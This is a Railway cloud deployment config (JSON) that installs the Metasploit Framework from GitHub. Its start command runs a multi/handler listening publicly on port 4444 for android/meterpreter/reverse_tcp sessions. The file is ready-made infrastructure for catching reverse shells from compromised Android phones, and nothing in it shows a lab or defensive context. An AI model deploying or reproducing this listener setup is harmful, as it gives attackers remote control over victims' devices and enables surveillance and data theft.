{
  "$schema": "https://railway.app/railway.schema.json",
  "build": {
    "builder": "NIXPACKS",
    "nixpacksPlan": {
      "providers": ["ruby"],
      "phases": {
        "setup": {
          "nixPkgs": ["ruby_3_2", "postgresql_14", "git", "bundler", "libpq"]
        },
        "install": {
          "cmds": [
            "git clone https://github.com/rapid7/metasploit-framework.git /app/msf || true",
            "cd /app/msf && bundle install --without development test",
            "export PATH=/app/msf:$PATH",
            "cd /app/msf && msfdb init || echo 'DB init skipped, manual later'"
          ]
        }
      }
    }
  },
  "deploy": {
    "startCommand": "cd /app/msf && export PATH=/app/msf:$PATH && msfdb init && msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j'",
    "restartPolicyType": "ON_FAILURE"
  }
}